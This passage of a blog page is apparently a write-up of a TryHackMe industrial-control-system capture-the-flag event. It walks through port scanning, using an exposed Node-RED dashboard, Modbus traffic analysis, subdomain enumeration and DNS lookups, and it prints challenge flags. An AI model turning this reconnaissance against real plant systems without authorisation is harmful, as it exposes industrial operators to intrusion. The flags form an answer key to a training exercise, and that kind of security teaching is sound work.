        <li><a href="#vulnerabilities-exploited">Vulnerabilities Exploited</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#breach">Breach</a></li>
    <li><a href="#discord">Discord</a>
      <ul>
        <li><a href="#description">Description</a></li>
        <li><a href="#step-1-following-the-trail-from-the-channel-description">Step 1: Following the Trail from the Channel Description</a></li>
        <li><a href="#step-2-executing-the-secret-function">Step 2: Executing the Secret Function</a></li>
      </ul>
    </li>
    <li><a href="#rogue-poller">Rogue Poller</a>
      <ul>
        <li><a href="#description-1">Description</a></li>
        <li><a href="#why-port-502">Why port 502?</a></li>
        <li><a href="#reassemble-the-conversation">Re‑assemble the conversation</a></li>
      </ul>
    </li>
    <li><a href="#osint-1">OSINT 1</a>
      <ul>
        <li><a href="#description-2">Description</a></li>
        <li><a href="#objective">Objective</a></li>
        <li><a href="#approach">Approach</a></li>
        <li><a href="#findings">Findings</a></li>
        <li><a href="#analysis">Analysis</a></li>
      </ul>
    </li>
    <li><a href="#osint-2">OSINT 2</a>
      <ul>
        <li><a href="#description-3">Description</a></li>
        <li><a href="#investigation-steps">Investigation Steps</a></li>
        <li><a href="#1-visited">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong></a></li>
        <li><a href="#2-analyzed-initjs">2. Analyzed <code>init.js</code></a></li>
        <li><a href="#3-queried-the-fallback-subdomain">3. Queried the Fallback Subdomain</a></li>
      </ul>
    </li>
    <li><a href="#orcam">ORCAM</a>
      <ul>
        <li><a href="#description-4">Description</a></li>
        <li><a href="#objective-1">Objective</a></li>
        <li><a href="#step-1-analyzing-the-email-writing_templateeml">Step 1: Analyzing the Email (Writing_Template.eml)</a></li>
        <li><a href="#observations">Observations</a></li>
        <li><a href="#step-2-extracting-the-malicious-macro">Step 2: Extracting the Malicious Macro</a></li>
        <li><a href="#key-findings-in-the-macro">Key Findings in the Macro:</a></li>
        <li><a href="#step-3-decrypting-the-shellcode">Step 3: Decrypting the Shellcode</a></li>
        <li><a href="#python-decryption-script">Python Decryption Script:</a></li>
        <li><a href="#output-analysis">Output Analysis</a></li>
        <li><a href="#summary-of-the-investigation">Summary of the Investigation</a></li>
      </ul>
    </li>
    <li><a href="#chess-industry">Chess Industry</a>
      <ul>
        <li><a href="#description-5">Description</a></li>
        <li><a href="#step-1-reconnaissance-port-scanning">Step 1: Reconnaissance (Port Scanning)</a></li>
        <li><a href="#nmap-scan">Nmap Scan</a></li>
        <li><a href="#step-2-web-enumeration">Step 2: Web Enumeration</a></li>
        <li><a href="#key-observations">Key Observations</a></li>
        <li><a href="#step-3-exploiting-the-finger-service-port-79">Step 3: Exploiting the Finger Service (Port 79)</a></li>
        <li><a href="#what-is-the-finger-protocol">What is the Finger Protocol?</a></li>
        <li><a href="#why-was-it-dangerous">Why Was It Dangerous?</a></li>
        <li><a href="#enumerate-users">Enumerate Users</a></li>
        <li><a href="#step-4-initial-foothold-via-ssh">Step 4: Initial Foothold via SSH</a></li>
        <li><a href="#step-5-privilege-escalation">Step 5: Privilege escalation</a></li>
        <li><a href="#attack-path-summary">Attack Path Summary</a></li>
      </ul>
    </li>
    <li><a href="#under-construction">Under Construction</a>
      <ul>
        <li><a href="#description-6">Description</a></li>
        <li><a href="#step-1-reconnaissance-port-scanning-with-nmap">Step 1: Reconnaissance (Port Scanning with Nmap)</a></li>
        <li><a href="#web-enumeration">Web Enumeration</a></li>
        <li><a href="#step-2-exploiting-lfi-local-file-inclusion">Step 2: Exploiting LFI (Local File Inclusion)</a></li>
        <li><a href="#step-3-finding-ssh-keysexploring-keys-directory">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory)</a></li>
        <li><a href="#ssh-access">SSH Access</a></li>
        <li><a href="#step-4-privilege-escalation-checking-sudo-permissions">Step 4: Privilege Escalation (Checking Sudo Permissions)</a></li>
        <li><a href="#escalating-to-root-via-vi">Escalating to Root via <code>vi</code></a></li>
        <li><a href="#vulnerabilities-exploited">Vulnerabilities Exploited</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>



            
            
          </div>
        </div>
      


      <div class="min-w-0 min-h-0 max-w-fit">
        

        <div class="article-content max-w-prose mb-20">
          <blockquote>
<p>Over the weekend, I took on the challenge to participate in Industrial Intrusion CTF by TryHackMe, it was a challenge that blends classic offensive security tactics with the niche world of Industrial Control Systems (ICS).
It offered a fun and insightful mix of categories including Web exploitation, OSINT, Forensics, and a light Boot2Root (B2R) experienceâ€&ldquo;perfect for anyone looking to dip their toes into ICS-focused challenges.
These writeups walk through my step-by-step approach in solving some of the easiest challenges, how I navigated each section, and what made this ICS-themed room both accessible and educational.
Whether you&rsquo;re new to TryHackMe or curious about the crossover between IT and OT security, this is a solid place to start.</p></blockquote>

<h2 class="relative group">Breach 
    <div id="breach" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#breach" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p><strong>Description</strong></p>
<blockquote>
<p>This engagement aims to find a way to open the gate by bypassing the badge authentication system.
The control infrastructure may hold a weakness: Dig in, explore, and see if you have what it takes to exploit it.
Be sure to check all the open ports, you never know which one might be your way in!</p></blockquote>
<p><strong>Target IP:</strong> <code>10.10.123.189</code></p>
<p><strong>Enumeration</strong></p>
<p>I did an NMAP scan and these were the results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV -T4 -p- 10.10.123.189
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-06-27 12:53 BST
</span></span><span class="line"><span class="cl">NSOCK ERROR <span class="o">[</span>161.2690s<span class="o">]</span> mksock_bind_addr<span class="o">()</span>: Bind to 0.0.0.0:111 failed <span class="o">(</span>IOD <span class="c1">#16): Address already in use (98)</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> ip-10-10-123-189.eu-west-1.compute.internal <span class="o">(</span>10.10.123.189<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00029s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65528</span> closed ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp    open  http          Werkzeug/3.1.3 Python/3.12.3
</span></span><span class="line"><span class="cl">102/tcp   open  iso-tsap      Siemens S7 PLC
</span></span><span class="line"><span class="cl">502/tcp   open  mbap?
</span></span><span class="line"><span class="cl">1880/tcp  open  vsat-control?
</span></span><span class="line"><span class="cl">8080/tcp  open  http-proxy    Werkzeug/2.3.7 Python/3.12.3
</span></span><span class="line"><span class="cl">44818/tcp open  EtherNetIP-2?
</span></span><span class="line"><span class="cl"><span class="m">4</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">&lt;<span class="o">=======================</span><span class="nv">SNIP</span><span class="o">======================</span>&gt;
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 162.41 seconds
</span></span></code></pre></div><p>HTTP on port 80 and 8080 both running Werkzeug Python servers (versions 3.1.3 and 2.3.7 respectively).
Werkzeug is a Python WSGI utility library often used with Flask apps, so these could be web applications worth exploring for vulnerabilities or misconfigurations.</p>
<p>Visiting port 80:







<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Por80" src="/images/THM/Breach/Port80.png">

  
</figure>
</p>
<p>Leveraging some online research, I learnt that there is a UI page for the service running on port 1880 which is Node-RED. On visiting the discovered UI endpoint, I changed the status of these switches:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="OT_Dashboard" src="/images/THM/Breach/OT_dashboard.png">

  
</figure>
</p>
<p>That got me the Flag for this challenge:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="Flag" src="/images/THM/Breach/Flag_Breach.png">

  
</figure>
</p>

<h2 class="relative group">Discord 
    <div id="discord" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#discord" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>Join our Discord server and find the flag?</p></blockquote>

<h3 class="relative group">Step 1: Following the Trail from the Channel Description 
    <div id="step-1-following-the-trail-from-the-channel-description" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-following-the-trail-from-the-channel-description" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The journey started in the <code>#industrial-intrusion-ctf</code> channel. While browsing through the channel list, I noticed something unusual in the <strong>channel description</strong>. As shown below, the description of the channel wasn&rsquo;t just text – it included a <strong>URL</strong> ending with: <code>/secret-function</code> :</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="DiscordTHM.png" src="/images/THM/Discord/DiscordTHM.png">

  
</figure>
</p>

<h3 class="relative group">Step 2: Executing the Secret Function 
    <div id="step-2-executing-the-secret-function" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-2-executing-the-secret-function" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>After seeing the <code>/secret-function</code> clue, I suspected it might be a <strong>custom slash command</strong> integrated into the TryHackMe Discord bot. Discord supports slash commands which can be triggered by typing <code>/</code> followed by the command name.</p>
<p>So, I typed: <code>/secret-function</code> .
As seen below, this triggered a response from the <strong>TryHackMe bot</strong> – and bingo! It revealed the flag:</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="DiscordTHM.png" src="/images/THM/Discord/DiscordFlag.png">

  
</figure>
</p>

<h2 class="relative group">Rogue Poller 
    <div id="rogue-poller" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#rogue-poller" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>An intruder has breached the internal OT network and systematically probed industrial devices for sensitive data.
Network captures reveal unusual traffic from a suspicious host scanning PLC memory over TCP port 502.
Analyse the provided PCAP and uncover what data the attacker retrieved during their register scans.</p></blockquote>

<h3 class="relative group">Why port 502? 
    <div id="why-port-502" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#why-port-502" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The capture was taken in an <strong>ICS/SCADA</strong> setting.</p>
<p>Industrial controllers often speak <strong>Modbus‑TCP</strong>, and Modbus always defaults to <strong>TCP port 502</strong>. If something suspicious is happening in a poller/PLC scenario, 502 is the first place to look. Filter for the said port: <code>tcp.port == 502</code> , Click on the first packet and follow TCP stream:</p>

<h3 class="relative group">Re‑assemble the conversation 
    <div id="reassemble-the-conversation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#reassemble-the-conversation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li><strong>Click the first packet</strong> in the list (frame 33 in my capture).</li>
<li><strong>Right‑click ▸ Follow ▸ TCP Stream</strong>.</li>
</ol>
<p>Wireshark stitches every segment of that TCP session together and shows it in a single window.</p>
<p>Make sure the <em>Show data as</em> drop‑down is set to <strong>ASCII</strong> – Modbus payloads are plain bytes, so ASCII is the quickest view when you&rsquo;re hunting for embedded strings.</p>
<p>






<figure>
    <img class="my-0 rounded-md" loading="lazy" alt="RoguePoller_Flag.png" src="/images/THM/RoguePoller/RoguePoller_Flag.png">

  
</figure>
</p>
<p>Every printable byte is exactly one character of the flag – they&rsquo;re merely separated by unprintable padding bytes (typical when registers are filled two bytes at a time).</p>
<ul>
<li>In the Follow‑Stream window copy just the visible characters (ignore dots and line breaks) into a text editor.</li>
<li>Delete the whitespace → the same string emerges.</li>
</ul>
<p>Reconstruct the flag: <code>THM{1nDu5tr14l_r3g1$t3rs}</code></p>

<h2 class="relative group">OSINT 1 
    <div id="osint-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#osint-1" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-2" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>Hexline, we need your help investigating the phishing attack from 3 months ago.
We believe the threat actor managed to hijack our domain virelia-water.it.com and used it to host some of their infrastructure at the time.
Use your OSINT skills to find information about the infrastructure they used during their campaign.</p></blockquote>

<h3 class="relative group">Objective 
    <div id="objective" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#objective" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Investigate potential infrastructure used in a phishing campaign tied to the hijacked domain <code>virelia-water.it.com</code>.</p>

<h3 class="relative group">Approach 
    <div id="approach" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#approach" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Using OSINT tools like <code>Sublist3r</code> and <code>crt.sh</code>, subdomain enumeration was performed to identify any attacker-controlled assets.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sublist3r -d virelia-water.it.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                 ____        _     _ _     _   _____
</span></span><span class="line"><span class="cl">                / ___<span class="p">|</span> _   _<span class="p">|</span> <span class="p">|</span>__ <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span>___<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>___ / _ __
</span></span><span class="line"><span class="cl">                <span class="se">\_</span>__ <span class="se">\|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="s1">&#39;_ \| | / __| __| |_ \| &#39;</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                 ___<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\ </span><span class="p">|</span>_ ___<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">                <span class="p">|</span>____/ <span class="se">\_</span>_,_<span class="p">|</span>_.__/<span class="p">|</span>_<span class="p">|</span>_<span class="p">|</span>___/<span class="se">\_</span>_<span class="p">|</span>____/<span class="p">|</span>_<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># Coded By Ahmed Aboul-Ela - @aboul3la</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Enumerating subdomains now <span class="k">for</span> virelia-water.it.com
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Baidu..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Yahoo..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Google..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Bing..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Ask..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Netcraft..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in DNSdumpster..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in Virustotal..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in ThreatCrowd..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in SSL Certificates..
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Searching now in PassiveDNS..
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Error: Virustotal probably now is blocking our requests
</span></span><span class="line"><span class="cl">Process DNSdumpster-8:
</span></span><span class="line"><span class="cl">&lt;<span class="o">========================</span><span class="nv">SNIP</span><span class="o">=====================</span>&gt;
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Total Unique Subdomains Found: <span class="m">2</span>
</span></span><span class="line"><span class="cl">54484d7b5375357373737d.virelia-water.it.com
</span></span><span class="line"><span class="cl">stage0.virelia-water.it.com
</span></span></code></pre></div>
<h3 class="relative group">Findings 
    <div id="findings" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#findings" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Two subdomains were discovered:</p>
<ul>
<li><code>54484d7b5375357373737d.virelia-water.it.com</code></li>
<li><code>stage0.virelia-water.it.com</code></li>
</ul>
<p>The first appeared to be encoded.</p>

<h3 class="relative group">Analysis 
    <div id="analysis" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#analysis" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li>The subdomain <code>54484d7b5375357373737d</code> was identified as hex.</li>
<li>Decoding it with <code>xxd</code> revealed a CTF flag:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> 54484d7b5375357373737d <span class="p">|</span> xxd -r -p <span class="c1"># Command used</span>
</span></span><span class="line"><span class="cl">THM<span class="o">{</span>Su5sss<span class="o">}</span> <span class="c1"># Subsequent Output</span>
</span></span></code></pre></div>
<h2 class="relative group">OSINT 2 
    <div id="osint-2" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#osint-2" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-3" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-3" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>Great work on uncovering that suspicious subdomain, Hexline.
However, your work here isn&rsquo;t done yet, we believe there is more.</p></blockquote>
<p>After uncovering an initial suspicious subdomain (<code>stage0.virelia-water.it.com</code>), further analysis led to the discovery of an external script and a fallback communication mechanism used by the attacker&rsquo;s infrastructure. The goal of OSINT 2 was to <strong>pivot from stage0 and uncover hidden indicators of compromise</strong> using DNS and passive reconnaissance techniques.</p>

<h3 class="relative group">Investigation Steps 
    <div id="investigation-steps" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#investigation-steps" aria-label="Anchor">#</a>
    </span>        
    
</h3>

<h3 class="relative group">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong> 
    <div id="1-visited" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#1-visited" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li>Discovered a spoofed ICS operator console web interface.</li>
<li>It attempted to load a remote JavaScript file from:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">https://raw.githubusercontent.com/SanTzu/uplink-config/main/init.js
</span></span></code></pre></div><p>You could see this from reviewing the page&rsquo;s source code.</p>

<h3 class="relative group">2. Analyzed <code>init.js</code> 
    <div id="2-analyzed-initjs" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#2-analyzed-initjs" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li>Contained a hardcoded object:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">var <span class="nv">beacon</span> <span class="o">=</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">  session_id: <span class="s2">&#34;O-TX-11-403&#34;</span>,
</span></span><span class="line"><span class="cl">  fallback_dns: <span class="s2">&#34;uplink-fallback.virelia-water.it.com&#34;</span>,
</span></span><span class="line"><span class="cl">  token: <span class="s2">&#34;JBSWY3DPEBLW64TMMQQQ==&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="p">;</span>
</span></span></code></pre></div><ul>
<li>The <code>token</code> decoded (Base32) to: <code>Hello123</code> (possibly a password or operator key).</li>
<li>Revealed the next lead: <code>uplink-fallback.virelia-water.it.com</code></li>
</ul>

<h3 class="relative group">3. Queried the Fallback Subdomain 
    <div id="3-queried-the-fallback-subdomain" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#3-queried-the-fallback-subdomain" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ul>
<li><code>A</code> and <code>CNAME</code> queries returned <strong>no IP</strong> – typical of dormant or DNS-only infrastructure.</li>
<li>However, a <code>TXT</code> record was present:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dig uplink-fallback.virelia-water.it.com TXT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.20.2-1-Debian &lt;&lt;&gt;&gt; uplink-fallback.virelia-water.it.com TXT
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">37332</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr rd ra<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>uplink-fallback.virelia-water.it.com. IN TXT
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">uplink-fallback.virelia-water.it.com. <span class="m">1799</span> IN TXT <span class="s2">&#34;eyJzZXNzaW9uIjoiVC1DTjEtMTcyIiwiZmxhZyI6IlRITXt1cGxpbmtfY2hhbm5lbF9jb25maXJtZWR9In0=&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">135</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.255.255.254#53<span class="o">(</span>10.255.255.254<span class="o">)</span> <span class="o">(</span>UDP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Mon Jun <span class="m">30</span> 15:56:14 EAT <span class="m">2025</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">151</span>
</span></span></code></pre></div><ul>
<li>Decoded it to JSON:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">json
</span></span><span class="line"><span class="cl">CopyEdit
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;session&#34;</span>: <span class="s2">&#34;T-CN1-172&#34;</span>,
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;flag&#34;</span>: <span class="s2">&#34;THM{uplink_channel_confirmed}&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div>
<h2 class="relative group">ORCAM 
    <div id="orcam" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#orcam" aria-label="Anchor">#</a>
    </span>        
    
</h2>

<h3 class="relative group">Description 
    <div id="description-4" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#description-4" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<blockquote>
<p>Dr. Ayaka Hirano loves to swim with the sharks.
So when the attackers from Virelia successfully retaliated against one of our own, it was up to the good doctor to take on the case.
Will Dr. Hirano be able to determine how this attack happened in the first place?</p>
<p>Artifact: <code>Writing_Template.eml</code></p></blockquote>

<h3 class="relative group">Objective 
    <div id="objective-1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#objective-1" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Analyze the provided <strong><code>.eml</code></strong> file (email) and uncover the hidden flag in the format <strong><code>THM{...}</code></strong></p>

<h3 class="relative group">Step 1: Analyzing the Email (Writing_Template.eml) 
    <div id="step-1-analyzing-the-email-writing_templateeml" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-1-analyzing-the-email-writing_templateeml" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>The email contains:</p>
<ul>
<li>
<p><strong>Sender:</strong> <strong><code>he1pdesk@orcam.thm</code></strong></p>
</li>
<li>
<p><strong>Recipient:</strong> <strong><code>admin@orcam.thm</code></strong></p>
</li>
<li>
<p><strong>Subject:</strong> <strong><code>Project Template</code></strong></p>
</li>
<li>
<p><strong>Body:</strong></p>
<blockquote>
